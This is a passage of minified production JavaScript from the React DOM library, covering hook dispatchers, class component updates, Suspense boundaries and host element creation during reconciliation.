n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function Jw(t,e,n){if(n&4194240){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,jp(t,n)}}var fu={readContext:qt,useCallback:Je,useContext:Je,useEffect:Je,useImperativeHandle:Je,useInsertionEffect:Je,useLayoutEffect:Je,useMemo:Je,useReducer:Je,useRef:Je,useState:Je,useDebugValue:Je,useDeferredValue:Je,useTransition:Je,useMutableSource:Je,useSyncExternalStore:Je,useId:Je,unstable_isNewReconciler:!1},NN={readContext:qt,useCallback:function(t,e){return fn().memoizedState=[t,e===void 0?null:e],t},useContext:qt,useEffect:Vy,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,Al(4194308,4,_w.bind(null,e,t),n)},useLayoutEffect:function(t,e){return Al(4194308,4,t,e)},useInsertionEffect:function(t,e){return Al(4,2,t,e)},useMemo:function(t,e){var n=fn();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var r=fn();return e=n!==void 0?n(e):e,r.memoizedState=r.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},r.queue=t,t=t.dispatch=TN.bind(null,de,t),[r.memoizedState,t]},useRef:function(t){var e=fn();return t={current:t},e.memoizedState=t},useState:By,useDebugValue:sm,useDeferredValue:function(t){return fn().memoizedState=t},useTransition:function(){var t=By(!1),e=t[0];return t=EN.bind(null,t[1]),fn().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var r=de,i=fn();if(se){if(n===void 0)throw Error(R(407));n=n()}else{if(n=e(),je===null)throw Error(R(349));gi&30||Dw(r,e,n)}i.memoizedState=n;var s={value:n,getSnapshot:e};return i.queue=s,Vy(Iw.bind(null,r,s,t),[t]),r.flags|=2048,Xo(9,Lw.bind(null,r,s,n,e),void 0,null),n},useId:function(){var t=fn(),e=je.identifierPrefix;if(se){var n=jn,r=In;n=(r&~(1<<32-nn(r)-1)).toString(32)+n,e=":"+e+"R"+n,n=Yo++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=CN++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},AN={readContext:qt,useCallback:Hw,useContext:qt,useEffect:im,useImperativeHandle:$w,useInsertionEffect:Vw,useLayoutEffect:zw,useMemo:Uw,useReducer:Td,useRef:Bw,useState:function(){return Td(Qo)},useDebugValue:sm,useDeferredValue:function(t){var e=Gt();return Ww(e,Oe.memoizedState,t)},useTransition:function(){var t=Td(Qo)[0],e=Gt().memoizedState;return[t,e]},useMutableSource:Rw,useSyncExternalStore:Ow,useId:Kw,unstable_isNewReconciler:!1},PN={readContext:qt,useCallback:Hw,useContext:qt,useEffect:im,useImperativeHandle:$w,useInsertionEffect:Vw,useLayoutEffect:zw,useMemo:Uw,useReducer:Md,useRef:Bw,useState:function(){return Md(Qo)},useDebugValue:sm,useDeferredValue:function(t){var e=Gt();return Oe===null?e.memoizedState=t:Ww(e,Oe.memoizedState,t)},useTransition:function(){var t=Md(Qo)[0],e=Gt().memoizedState;return[t,e]},useMutableSource:Rw,useSyncExternalStore:Ow,useId:Kw,unstable_isNewReconciler:!1};function Qt(t,e){if(t&&t.defaultProps){e=he({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}function rh(t,e,n,r){e=t.memoizedState,n=n(r,e),n=n==null?e:he({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var bc={isMounted:function(t){return(t=t._reactInternals)?Mi(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var r=at(),i=kr(t),s=Bn(r,i);s.payload=e,n!=null&&(s.callback=n),e=wr(t,s,i),e!==null&&(rn(e,t,i,r),Ml(e,t,i))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var r=at(),i=kr(t),s=Bn(r,i);s.tag=1,s.payload=e,n!=null&&(s.callback=n),e=wr(t,s,i),e!==null&&(rn(e,t,i,r),Ml(e,t,i))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=at(),r=kr(t),i=Bn(n,r);i.tag=2,e!=null&&(i.callback=e),e=wr(t,i,r),e!==null&&(rn(e,t,r,n),Ml(e,t,r))}};function zy(t,e,n,r,i,s,o){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(r,s,o):e.prototype&&e.prototype.isPureReactComponent?!Uo(n,r)||!Uo(i,s):!0}function Yw(t,e,n){var r=!1,i=Pr,s=e.contextType;return typeof s=="object"&&s!==null?s=qt(s):(i=xt(e)?pi:nt.current,r=e.contextTypes,s=(r=r!=null)?ps(t,i):Pr),e=new e(n,s),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=bc,t.stateNode=e,e._reactInternals=t,r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=i,t.__reactInternalMemoizedMaskedChildContext=s),e}function _y(t,e,n,r){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,r),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,r),e.state!==t&&bc.enqueueReplaceState(e,e.state,null)}function ih(t,e,n,r){var i=t.stateNode;i.props=n,i.state=t.memoizedState,i.refs={},Qp(t);var s=e.contextType;typeof s=="object"&&s!==null?i.context=qt(s):(s=xt(e)?pi:nt.current,i.context=ps(t,s)),i.state=t.memoizedState,s=e.getDerivedStateFromProps,typeof s=="function"&&(rh(t,e,s,n),i.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(e=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),e!==i.state&&bc.enqueueReplaceState(i,i.state,null),uu(t,n,i,r),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308)}function xs(t,e){try{var n="",r=e;do n+=iM(r),r=r.return;while(r);var i=n}catch(s){i=`
Error generating stack: `+s.message+`
`+s.stack}return{value:t,source:e,stack:i,digest:null}}function Nd(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function sh(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var RN=typeof WeakMap=="function"?WeakMap:Map;function Qw(t,e,n){n=Bn(-1,n),n.tag=3,n.payload={element:null};var r=e.value;return n.callback=function(){pu||(pu=!0,mh=r),sh(t,e)},n}function Xw(t,e,n){n=Bn(-1,n),n.tag=3;var r=t.type.getDerivedStateFromError;if(typeof r=="function"){var i=e.value;n.payload=function(){return r(i)},n.callback=function(){sh(t,e)}}var s=t.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(n.callback=function(){sh(t,e),typeof r!="function"&&(Sr===null?Sr=new Set([this]):Sr.add(this));var o=e.stack;this.componentDidCatch(e.value,{componentStack:o!==null?o:""})}),n}function $y(t,e,n){var r=t.pingCache;if(r===null){r=t.pingCache=new RN;var i=new Set;r.set(e,i)}else i=r.get(e),i===void 0&&(i=new Set,r.set(e,i));i.has(n)||(i.add(n),t=WN.bind(null,t,e,n),e.then(t,t))}function Hy(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function Uy(t,e,n,r,i){return t.mode&1?(t.flags|=65536,t.lanes=i,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=Bn(-1,1),e.tag=2,wr(n,e,1))),n.lanes|=1),t)}var ON=Gn.ReactCurrentOwner,mt=!1;function it(t,e,n,r){e.child=t===null?Mw(e,null,n,r):gs(e,t.child,n,r)}function Wy(t,e,n,r,i){n=n.render;var s=e.ref;return as(e,i),r=nm(t,e,n,r,s,i),n=rm(),t!==null&&!mt?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,Un(t,e,i)):(se&&n&&Up(e),e.flags|=1,it(t,e,r,i),e.child)}function Ky(t,e,n,r,i){if(t===null){var s=n.type;return typeof s=="function"&&!hm(s)&&s.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=s,Zw(t,e,s,r,i)):(t=Dl(n.type,null,r,e,e.mode,i),t.ref=e.ref,t.return=e,e.child=t)}if(s=t.child,!(t.lanes&i)){var o=s.memoizedProps;if(n=n.compare,n=n!==null?n:Uo,n(o,r)&&t.ref===e.ref)return Un(t,e,i)}return e.flags|=1,t=br(s,r),t.ref=e.ref,t.return=e,e.child=t}function Zw(t,e,n,r,i){if(t!==null){var s=t.memoizedProps;if(Uo(s,r)&&t.ref===e.ref)if(mt=!1,e.pendingProps=r=s,(t.lanes&i)!==0)t.flags&131072&&(mt=!0);else return e.lanes=t.lanes,Un(t,e,i)}return oh(t,e,n,r,i)}function eS(t,e,n){var r=e.pendingProps,i=r.children,s=t!==null?t.memoizedState:null;if(r.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},te(Ji,Et),Et|=n;else{if(!(n&1073741824))return t=s!==null?s.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,te(Ji,Et),Et|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=s!==null?s.baseLanes:n,te(Ji,Et),Et|=r}else s!==null?(r=s.baseLanes|n,e.memoizedState=null):r=n,te(Ji,Et),Et|=r;return it(t,e,i,n),e.child}function tS(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function oh(t,e,n,r,i){var s=xt(n)?pi:nt.current;return s=ps(e,s),as(e,i),n=nm(t,e,n,r,s,i),r=rm(),t!==null&&!mt?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~i,Un(t,e,i)):(se&&r&&Up(e),e.flags|=1,it(t,e,n,i),e.child)}function qy(t,e,n,r,i){if(xt(n)){var s=!0;iu(e)}else s=!1;if(as(e,i),e.stateNode===null)Pl(t,e),Yw(e,n,r),ih(e,n,r,i),r=!0;else if(t===null){var o=e.stateNode,a=e.memoizedProps;o.props=a;var l=o.context,u=n.contextType;typeof u=="object"&&u!==null?u=qt(u):(u=xt(n)?pi:nt.current,u=ps(e,u));var c=n.getDerivedStateFromProps,d=typeof c=="function"||typeof o.getSnapshotBeforeUpdate=="function";d||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==r||l!==u)&&_y(e,o,r,u),rr=!1;var f=e.memoizedState;o.state=f,uu(e,r,o,i),l=e.memoizedState,a!==r||f!==l||yt.current||rr?(typeof c=="function"&&(rh(e,n,c,r),l=e.memoizedState),(a=rr||zy(e,n,a,r,f,l,u))?(d||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(e.flags|=4194308)):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=r,e.memoizedState=l),o.props=r,o.state=l,o.context=u,r=a):(typeof o.componentDidMount=="function"&&(e.flags|=4194308),r=!1)}else{o=e.stateNode,Aw(t,e),a=e.memoizedProps,u=e.type===e.elementType?a:Qt(e.type,a),o.props=u,d=e.pendingProps,f=o.context,l=n.contextType,typeof l=="object"&&l!==null?l=qt(l):(l=xt(n)?pi:nt.current,l=ps(e,l));var h=n.getDerivedStateFromProps;(c=typeof h=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(a!==d||f!==l)&&_y(e,o,r,l),rr=!1,f=e.memoizedState,o.state=f,uu(e,r,o,i);var p=e.memoizedState;a!==d||f!==p||yt.current||rr?(typeof h=="function"&&(rh(e,n,h,r),p=e.memoizedState),(u=rr||zy(e,n,u,r,f,p,l)||!1)?(c||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(r,p,l),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(r,p,l)),typeof o.componentDidUpdate=="function"&&(e.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof o.componentDidUpdate!="function"||a===t.memoizedProps&&f===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===t.memoizedProps&&f===t.memoizedState||(e.flags|=1024),e.memoizedProps=r,e.memoizedState=p),o.props=r,o.state=p,o.context=l,r=u):(typeof o.componentDidUpdate!="function"||a===t.memoizedProps&&f===t.memoizedState||(e.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||a===t.memoizedProps&&f===t.memoizedState||(e.flags|=1024),r=!1)}return ah(t,e,n,r,s,i)}function ah(t,e,n,r,i,s){tS(t,e);var o=(e.flags&128)!==0;if(!r&&!o)return i&&Oy(e,n,!1),Un(t,e,s);r=e.stateNode,ON.current=e;var a=o&&typeof n.getDerivedStateFromError!="function"?null:r.render();return e.flags|=1,t!==null&&o?(e.child=gs(e,t.child,null,s),e.child=gs(e,null,a,s)):it(t,e,a,s),e.memoizedState=r.state,i&&Oy(e,n,!0),e.child}function nS(t){var e=t.stateNode;e.pendingContext?Ry(t,e.pendingContext,e.pendingContext!==e.context):e.context&&Ry(t,e.context,!1),Xp(t,e.containerInfo)}function Gy(t,e,n,r,i){return ms(),Kp(i),e.flags|=256,it(t,e,n,r),e.child}var lh={dehydrated:null,treeContext:null,retryLane:0};function uh(t){return{baseLanes:t,cachePool:null,transitions:null}}function rS(t,e,n){var r=e.pendingProps,i=le.current,s=!1,o=(e.flags&128)!==0,a;if((a=o)||(a=t!==null&&t.memoizedState===null?!1:(i&2)!==0),a?(s=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(i|=1),te(le,i&1),t===null)return th(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(o=r.children,t=r.fallback,s?(r=e.mode,s=e.child,o={mode:"hidden",children:o},!(r&1)&&s!==null?(s.childLanes=0,s.pendingProps=o):s=Tc(o,r,0,null),t=si(t,r,n,null),s.return=e,t.return=e,s.sibling=t,e.child=s,e.child.memoizedState=uh(n),e.memoizedState=lh,t):om(e,o));if(i=t.memoizedState,i!==null&&(a=i.dehydrated,a!==null))return DN(t,e,o,r,a,i,n);if(s){s=r.fallback,o=e.mode,i=t.child,a=i.sibling;var l={mode:"hidden",children:r.children};return!(o&1)&&e.child!==i?(r=e.child,r.childLanes=0,r.pendingProps=l,e.deletions=null):(r=br(i,l),r.subtreeFlags=i.subtreeFlags&14680064),a!==null?s=br(a,s):(s=si(s,o,n,null),s.flags|=2),s.return=e,r.return=e,r.sibling=s,e.child=r,r=s,s=e.child,o=t.child.memoizedState,o=o===null?uh(n):{baseLanes:o.baseLanes|n,cachePool:null,transitions:o.transitions},s.memoizedState=o,s.childLanes=t.childLanes&~n,e.memoizedState=lh,r}return s=t.child,t=s.sibling,r=br(s,{mode:"visible",children:r.children}),!(e.mode&1)&&(r.lanes=n),r.return=e,r.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=r,e.memoizedState=null,r}function om(t,e){return e=Tc({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function nl(t,e,n,r){return r!==null&&Kp(r),gs(e,t.child,null,n),t=om(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function DN(t,e,n,r,i,s,o){if(n)return e.flags&256?(e.flags&=-257,r=Nd(Error(R(422))),nl(t,e,o,r)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(s=r.fallback,i=e.mode,r=Tc({mode:"visible",children:r.children},i,0,null),s=si(s,i,o,null),s.flags|=2,r.return=e,s.return=e,r.sibling=s,e.child=r,e.mode&1&&gs(e,t.child,null,o),e.child.memoizedState=uh(o),e.memoizedState=lh,s);if(!(e.mode&1))return nl(t,e,o,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var a=r.dgst;return r=a,s=Error(R(419)),r=Nd(s,r,void 0),nl(t,e,o,r)}if(a=(o&t.childLanes)!==0,mt||a){if(r=je,r!==null){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=i&(r.suspendedLanes|o)?0:i,i!==0&&i!==s.retryLane&&(s.retryLane=i,Hn(t,i),rn(r,t,i,-1))}return fm(),r=Nd(Error(R(421))),nl(t,e,o,r)}return i.data==="$?"?(e.flags|=128,e.child=t.child,e=KN.bind(null,t),i._reactRetry=e,null):(t=s.treeContext,Mt=vr(i.nextSibling),Nt=e,se=!0,Zt=null,t!==null&&(Bt[Vt++]=In,Bt[Vt++]=jn,Bt[Vt++]=mi,In=t.id,jn=t.overflow,mi=e),e=om(e,r.children),e.flags|=4096,e)}function Jy(t,e,n){t.lanes|=e;var r=t.alternate;r!==null&&(r.lanes|=e),nh(t.return,e,n)}function Ad(t,e,n,r,i){var s=t.memoizedState;s===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i}:(s.isBackwards=e,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=n,s.tailMode=i)}function iS(t,e,n){var r=e.pendingProps,i=r.revealOrder,s=r.tail;if(it(t,e,r.children,n),r=le.current,r&2)r=r&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&Jy(t,n,e);else if(t.tag===19)Jy(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}r&=1}if(te(le,r),!(e.mode&1))e.memoizedState=null;else switch(i){case"forwards":for(n=e.child,i=null;n!==null;)t=n.alternate,t!==null&&cu(t)===null&&(i=n),n=n.sibling;n=i,n===null?(i=e.child,e.child=null):(i=n.sibling,n.sibling=null),Ad(e,!1,i,n,s);break;case"backwards":for(n=null,i=e.child,e.child=null;i!==null;){if(t=i.alternate,t!==null&&cu(t)===null){e.child=i;break}t=i.sibling,i.sibling=n,n=i,i=t}Ad(e,!0,n,null,s);break;case"together":Ad(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function Pl(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function Un(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),yi|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(R(153));if(e.child!==null){for(t=e.child,n=br(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=br(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function LN(t,e,n){switch(e.tag){case 3:nS(e),ms();break;case 5:Pw(e);break;case 1:xt(e.type)&&iu(e);break;case 4:Xp(e,e.stateNode.containerInfo);break;case 10:var r=e.type._context,i=e.memoizedProps.value;te(au,r._currentValue),r._currentValue=i;break;case 13:if(r=e.memoizedState,r!==null)return r.dehydrated!==null?(te(le,le.current&1),e.flags|=128,null):n&e.child.childLanes?rS(t,e,n):(te(le,le.current&1),t=Un(t,e,n),t!==null?t.sibling:null);te(le,le.current&1);break;case 19:if(r=(n&e.childLanes)!==0,t.flags&128){if(r)return iS(t,e,n);e.flags|=128}if(i=e.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),te(le,le.current),r)break;return null;case 22:case 23:return e.lanes=0,eS(t,e,n)}return Un(t,e,n)}var sS,ch,oS,aS;sS=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};ch=function(){};oS=function(t,e,n,r){var i=t.memoizedProps;if(i!==r){t=e.stateNode,Yr(xn.current);var s=null;switch(n){case"input":i=Of(t,i),r=Of(t,r),s=[];break;case"select":i=he({},i,{value:void 0}),r=he({},r,{value:void 0}),s=[];break;case"textarea":i=If(t,i),r=If(t,r),s=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(t.onclick=nu)}Ff(n,r);var o;n=null;for(u in i)if(!r.hasOwnProperty(u)&&i.hasOwnProperty(u)&&i[u]!=null)if(u==="style"){var a=i[u];for(o in a)a.hasOwnProperty(o)&&(n||(n={}),n[o]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(Fo.hasOwnProperty(u)?s||(s=[]):(s=s||[]).push(u,null));for(u in r){var l=r[u];if(a=i!=null?i[u]:void 0,r.hasOwnProperty(u)&&l!==a&&(l!=null||a!=null))if(u==="style")if(a){for(o in a)!a.hasOwnProperty(o)||l&&l.hasOwnProperty(o)||(n||(n={}),n[o]="");for(o in l)l.hasOwnProperty(o)&&a[o]!==l[o]&&(n||(n={}),n[o]=l[o])}else n||(s||(s=[]),s.push(u,n)),n=l;else u==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,a=a?a.__html:void 0,l!=null&&a!==l&&(s=s||[]).push(u,l)):u==="children"?typeof l!="string"&&typeof l!="number"||(s=s||[]).push(u,""+l):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(Fo.hasOwnProperty(u)?(l!=null&&u==="onScroll"&&ne("scroll",t),s||a===l||(s=[])):(s=s||[]).push(u,l))}n&&(s=s||[]).push("style",n);var u=s;(e.updateQueue=u)&&(e.flags|=4)}};aS=function(t,e,n,r){n!==r&&(e.flags|=4)};function Ys(t,e){if(!se)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:r.sibling=null}}function Ye(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,r=0;if(e)for(var i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=t,i=i.sibling;else for(i=t.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=t,i=i.sibling;return t.subtreeFlags|=r,t.childLanes=n,e}function IN(t,e,n){var r=e.pendingProps;switch(Wp(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Ye(e),null;case 1:return xt(e.type)&&ru(),Ye(e),null;case 3:return r=e.stateNode,ys(),ie(yt),ie(nt),em(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(t===null||t.child===null)&&(el(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,Zt!==null&&(xh(Zt),Zt=null))),ch(t,e),Ye(e),null;case 5:Zp(e);var i=Yr(Jo.current);if(n=e.type,t!==null&&e.stateNode!=null)oS(t,e,n,r,i),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!r){if(e.stateNode===null)throw Error(R(166));return Ye(e),null}if(t=Yr(xn.current),el(e)){r=e.stateNode,n=e.type;var s=e.memoizedProps;switch(r[gn]=e,r[qo]=s,t=(e.mode&1)!==0,n){case"dialog":ne("cancel",r),ne("close",r);break;case"iframe":case"object":case"embed":ne("load",r);break;case"video":case"audio":for(i=0;i<oo.length;i++)ne(oo[i],r);break;case"source":ne("error",r);break;case"img":case"image":case"link":ne("error",r),ne("load",r);break;case"details":ne("toggle",r);break;case"input":iy(r,s),ne("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},ne("invalid",r);break;case"textarea":oy(r,s),ne("invalid",r)}Ff(n,s),i=null;for(var o in s)if(s.hasOwnProperty(o)){var a=s[o];o==="children"?typeof a=="string"?r.textContent!==a&&(s.suppressHydrationWarning!==!0&&Za(r.textContent,a,t),i=["children",a]):typeof a=="number"&&r.textContent!==""+a&&(s.suppressHydrationWarning!==!0&&Za(r.textContent,a,t),i=["children",""+a]):Fo.hasOwnProperty(o)&&a!=null&&o==="onScroll"&&ne("scroll",r)}switch(n){case"input":Wa(r),sy(r,s,!0);break;case"textarea":Wa(r),ay(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=nu)}r=i,e.updateQueue=r,r!==null&&(e.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=I1(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=o.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof r.is=="string"?t=o.createElement(n,{is:r.is}):(t=o.createElement(n),n==="select"&&(o=t,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):t=o.createElementNS(t,n),t[gn]=e,t[qo]=r,sS(t,e,!1,!1),e.stateNode=t;e:{switch(o=Bf(n,r),n){case"dialog":ne("cancel",t),ne("close",t),i=r;break;case"iframe":case"object":case"embed":ne("load",t),i=r;break;case"video":case"audio":for(i=0;i<oo.length;i++)ne(oo[i],t);i=r;break;case"source":ne("error",t),i=r;break;case"img":case"image":case"link":ne("error",t),ne("load",t),i=r;break;case"details":ne("toggle",t),i=r;break;case"input":iy(t,r),i=Of(t,r),ne("invalid",t);break;case"option":i=r;break;case"select":t._wrapperState={wasMultiple:!!r.multiple},i=he({},r,{value:void 0}),ne("invalid",t);break;case"textarea":oy(t,r),i=If(t,r),ne("invalid",t);break;default:i=r}Ff(n,i),a=i;for(s in a)if(a.hasOwnProperty(s)){var l=a[s];s==="style"?B1(t,l):s==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&j1(t,l)):s==="children"?typeof l=="string"?(n!=="textarea"||l!=="")&&Bo(t,l):typeof l=="number"&&Bo(t,""+l):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(Fo.hasOwnProperty(s)?l!=null&&s==="onScroll"&&ne("scroll",t):l!=null&&Pp(t,s,l,o))}switch(n){case"input":Wa(t),sy(t,r,!1);break;case"textarea":Wa(t),ay(t);break;case"option":r.value!=null&&t.setAttribute("value",""+Ar(r.value));break;case"select":t.multiple=!!r.multiple,s=r.value,s!=null?ns(t,!!r.multiple,s,!1):r.defaultValue!=null&&ns(t,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(t.onclick=nu)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Ye(e),null;case 6:if(t&&e.stateNode!=null)aS(t,e,t.memoizedProps,r);else{if(typeof r!="string"&&e.stateNode===null)throw Error(R(166));if(n=Yr(Jo.current),Yr(xn.current),el(e)){if(r=e.stateNode,n=e.memoizedProps,r[gn]=e,(s=r.nodeValue!==n)&&(t=Nt,t!==null))switch(t.tag){case 3:Za(r.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&Za(r.nodeValue,n,(t.mode&1)!==0)}s&&(e.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[gn]=e,e.stateNode=r}return Ye(e),null;case 13:if(ie(le),r=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(se&&Mt!==null&&e.mode&1&&!(e.flags&128))Ew(),ms(),e.flags|=98560,s=!1;else if(s=el(e),r!==null&&r.dehydrated!==null){if(t===null){if(!s)throw Error(R(318));if(s=e.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(R(317));s[gn]=e}else ms(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Ye(e),s=!1}else Zt!==null&&(xh(Zt),Zt=null),s=!0;if(!s)return e.flags&65536?e:null}return e.flags&128?(e.lanes=n,e):(r=r!==null,r!==(t!==null&&t.memoizedState!==null)&&r&&(e.child.flags|=8192,e.mode&1&&(t===null||le.current&1?De===0&&(De=3):fm())),e.updateQueue!==null&&(e.flags|=4),Ye(e),null);case 4:return ys(),ch(t,e),t===null&&Wo(e.stateNode.containerInfo),Ye(e),null;case 10:return Jp(e.type._context),Ye(e),null;case 17:return xt(e.type)&&ru(),Ye(e),null;case 19:if(ie(le),s=e.memoizedState,s===null)return 